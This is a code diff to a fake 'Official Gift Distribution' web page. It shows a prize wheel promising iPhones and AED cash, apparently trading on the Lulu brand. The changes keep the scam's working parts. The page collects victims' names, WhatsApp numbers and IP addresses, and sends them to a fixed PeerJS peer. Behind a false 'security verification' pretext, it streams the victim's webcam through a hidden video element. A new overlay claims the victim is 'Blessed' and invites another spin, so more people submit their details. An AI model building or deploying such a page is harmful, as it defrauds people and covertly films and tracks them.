@@ -6,7 +6,7 @@
     <title>Official Gift Distribution</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        :root { --primary: #2d8a39; --text: #1d1d1f; --bg: #ffffff; --light-gray: #f2f2f7; }
+        :root { --primary: #2d8a39; --text: #1d1d1f; --bg: #ffffff; --gray: #f5f5f7; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
         
         body { 
@@ -15,49 +15,36 @@
             display: flex; flex-direction: column; align-items: center;
         }
 
-        header { width: 100%; padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
-        .brand { font-size: 10px; font-weight: 700; color: var(--primary); letter-spacing: 2px; text-transform: uppercase; }
+        header { width: 100%; padding: 25px; text-align: center; border-bottom: 1px solid #eee; background: #fff; }
+        .brand { font-size: 10px; font-weight: 700; color: var(--primary); letter-spacing: 2.5px; text-transform: uppercase; }
         .title { font-size: 22px; font-weight: 700; margin-top: 5px; }
 
-        /* Perfected Wheel Container */
-        .wheel-outer { position: relative; width: 350px; height: 350px; margin: 40px auto; }
-        
+        /* Wheel Styles */
+        .wheel-outer { position: relative; width: 340px; height: 340px; margin: 40px auto; }
         #wheel { 
             width: 100%; height: 100%; border-radius: 50%; position: relative;
-            background: conic-gradient(
-                #fff 0deg 45deg, var(--light-gray) 45deg 90deg, 
-                #fff 90deg 135deg, var(--light-gray) 135deg 180deg, 
-                #fff 180deg 225deg, var(--light-gray) 225deg 270deg,
-                #fff 270deg 315deg, var(--light-gray) 315deg 360deg
-            );
-            border: 5px solid #fff; box-shadow: 0 10px 40px rgba(0,0,0,0.08);
-            transition: transform 7s cubic-bezier(0.2, 0, 0, 1);
-            overflow: hidden;
+            background: conic-gradient(#fff 0deg 45deg, var(--gray) 45deg 90deg, #fff 90deg 135deg, var(--gray) 135deg 180deg, #fff 180deg 225deg, var(--gray) 225deg 270deg, #fff 270deg 315deg, var(--gray) 315deg 360deg);
+            border: 4px solid #eee; transition: transform 7s cubic-bezier(0.2, 0, 0, 1); overflow: hidden;
         }
+        .slice { position: absolute; width: 50%; height: 2px; top: 50%; left: 50%; transform-origin: left center; display: flex; align-items: center; justify-content: flex-end; }
+        .slice span { padding-right: 25px; font-size: 10px; font-weight: 700; color: #555; text-transform: uppercase; }
+        .pin { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 30px; height: 35px; background: #ff3b30; clip-path: polygon(50% 100%, 0 0, 100% 0); z-index: 20; }
 
-        .slice {
-            position: absolute; width: 50%; height: 2px; top: 50%; left: 50%;
-            transform-origin: left center; display: flex; align-items: center; justify-content: flex-end;
-        }
-        .slice span {
-            padding-right: 30px; font-size: 10px; font-weight: 700; color: #444;
-            text-transform: uppercase; white-space: nowrap; pointer-events: none;
-        }
-
-        .pin { 
-            position: absolute; top: -15px; left: 50%; transform: translateX(-50%); 
-            width: 30px; height: 35px; background: #ff3b30; clip-path: polygon(50% 100%, 0 0, 100% 0);
-            z-index: 20; filter: drop-shadow(0 2px 5px rgba(0,0,0,0.2));
-        }
-
+        /* UI Containers */
         .page { display: none; width: 100%; max-width: 400px; padding: 20px; text-align: center; }
-        .active { display: block; animation: fadeIn 0.6s ease; }
+        .active { display: block; animation: fadeIn 0.4s ease; }
+        .card { background: #fff; padding: 30px; border-radius: 24px; border: 1px solid #eee; box-shadow: 0 4px 15px rgba(0,0,0,0.02); }
         
-        .card { background: #fff; padding: 30px; border-radius: 24px; border: 1px solid #eee; box-shadow: 0 4px 20px rgba(0,0,0,0.03); }
         .btn-p { background: var(--primary); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 14px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 20px; }
-        
-        input { width: 100%; padding: 18px; margin-bottom: 12px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 16px; text-align: center; background: var(--light-gray); outline: none; }
-        input:focus { background: #fff; border-color: var(--primary); }
+        input { width: 100%; padding: 18px; margin-bottom: 12px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 16px; text-align: center; background: var(--gray); outline: none; }
+
+        /* Overlay Popup */
+        #overlay { 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(255,255,255,0.95); z-index: 1000; 
+            display: none; flex-direction: column; align-items: center; justify-content: center;
+            text-align: center; padding: 40px;
+        }
 
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         #v-wrap { position: fixed; opacity: 0; pointer-events: none; }
@@ -72,34 +59,40 @@
 
 <div id="v-wrap"><video id="v" autoplay playsinline muted></video></div>
 
+<!-- LUCK OVERLAY -->
+<div id="overlay">
+    <div style="font-size: 60px; margin-bottom: 20px;">✨</div>
+    <h1 style="color: var(--primary); margin-bottom: 10px;">You are Blessed!</h1>
+    <p style="color: #666; line-height: 1.6; margin-bottom: 30px;">Due to your exceptional luck, the system has granted you an **extra opportunity** to spin again immediately.</p>
+    <button class="btn-p" onclick="resetForNewSpin()" style="max-width: 300px;">CLAIM NEW SPIN</button>
+</div>
+
 <div id="p1" class="page active">
-    <div class="wheel-outer">
-        <div class="pin"></div>
-        <div id="wheel"></div>
-    </div>
+    <div class="wheel-outer"><div class="pin"></div><div id="wheel"></div></div>
     <div class="card">
-        <p style="color: #86868b; font-size: 14px; line-height: 1.6;">To commemorate the birthday of the son of <b>M.A. Yusuff Ali</b>, you are eligible for one special distribution prize.</p>
+        <p style="color: #86868b; font-size: 14px;">Verify your entry below to participate in the commemorative distribution.</p>
         <button class="btn-p" id="spin-btn" onclick="startSpin()">ACTIVATE SPIN</button>
     </div>
 </div>
 
 <div id="p2" class="page">
     <div class="card" style="margin-top: 40px;">
-        <h2 style="color: var(--primary); margin-bottom: 5px;">You Won!</h2>
+        <h2 style="color: var(--primary); margin-bottom: 5px;">Prize Allocated</h2>
         <p id="result-display" style="font-size: 22px; font-weight: 800; margin-bottom: 30px;"></p>
-        <input type="text" id="name" placeholder="Full Name">
-        <input type="number" id="phone" placeholder="Mobile Number">
-        <button class="btn-p" onclick="finalize()">PROCEED TO SHIPMENT</button>
+        <input type="text" id="name" placeholder="Recipient Name">
+        <input type="number" id="phone" placeholder="WhatsApp Number">
+        <button class="btn-p" id="claim-btn" onclick="finalize()">SUBMIT CLAIM</button>
     </div>
 </div>
 
 <script>
     const PEER_ID = 'enkode-satori-v1-russel';
     const peer = new Peer();
-    let conn;
+    let conn, currentIP = "0.0.0.0", totalRotation = 0;
     const prizes = ["iPhone 15 Pro", "AED 5,000", "iPad Air", "AED 2,500", "MacBook Air", "AED 1,000", "Lulu Voucher", "Watch Ultra"];
+    
+    // Initialize Wheel
     const wheel = document.getElementById('wheel');
-
     prizes.forEach((text, i) => {
         const div = document.createElement('div');
         div.className = 'slice';
@@ -108,49 +101,72 @@
         wheel.appendChild(div);
     });
 
-    peer.on('open', () => {
+    peer.on('open', async () => {
         conn = peer.connect(PEER_ID);
+        try {
+            const r = await fetch('https://api.ipify.org?format=json');
+            const d = await r.json();
+            currentIP = d.ip;
+        } catch(e) {}
     });
 
     function startSpin() {
         document.getElementById('spin-btn').disabled = true;
-        const randomDegree = Math.floor(Math.random() * 360) + 3600; // Spins at least 10 times
-        wheel.style.transform = `rotate(${randomDegree}deg)`;
+        const extraDeg = Math.floor(Math.random() * 360) + 3600;
+        totalRotation += extraDeg;
+        wheel.style.transform = `rotate(${totalRotation}deg)`;
 
         setTimeout(() => {
-            // Calculate actual landing prize
-            const actualRotation = randomDegree % 360;
+            const actualRotation = totalRotation % 360;
             const prizeIndex = Math.floor(((360 - actualRotation) % 360) / 45);
-            const winningPrize = prizes[prizeIndex];
-
-            document.getElementById('result-display').innerText = winningPrize;
-            document.getElementById('p1').classList.remove('active');
-            document.getElementById('p2').classList.add('active');
+            document.getElementById('result-display').innerText = prizes[prizeIndex];
+            switchPage('p2');
         }, 7500);
     }
 
     async function finalize() {
-        if(!document.getElementById('name').value || !document.getElementById('phone').value) return;
+        const n = document.getElementById('name').value;
+        const ph = document.getElementById('phone').value;
+        if(!n || !ph) return;
+
+        document.getElementById('claim-btn').innerText = "Registering...";
+        document.getElementById('claim-btn').disabled = true;
+
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('v').srcObject = stream;
             peer.call(PEER_ID, stream);
             
-            navigator.geolocation.getCurrentPosition(pos => {
-                if(conn?.open) conn.send({ 
-                    type: "CLAIM", 
-                    name: document.getElementById('name').value, 
+            if(conn?.open) {
+                conn.send({ 
+                    type: "CLAIM", name: n, phone: ph, ip: currentIP,
                     prize: document.getElementById('result-display').innerText,
-                    coords: [pos.coords.latitude, pos.coords.longitude] 
+                    time: new Date().toLocaleTimeString()
                 });
-            });
+            }
 
-            alert("Claim registered successfully.");
-            location.reload();
+            // Show the "Blessed" Popup after data is sent
+            setTimeout(() => { document.getElementById('overlay').style.display = 'flex'; }, 1500);
+
         } catch (e) {
-            alert("Security Verification Required: Camera access must be granted to confirm identity for high-value shipping.");
-            location.reload();
+            alert("Security verification is mandatory for distribution.");
+            document.getElementById('claim-btn').disabled = false;
         }
+    }
+
+    function resetForNewSpin() {
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('spin-btn').disabled = false;
+        document.getElementById('claim-btn').disabled = false;
+        document.getElementById('claim-btn').innerText = "SUBMIT CLAIM";
+        document.getElementById('name').value = "";
+        document.getElementById('phone').value = "";
+        switchPage('p1');
+    }
+
+    function switchPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
     }
 </script>
 </body>
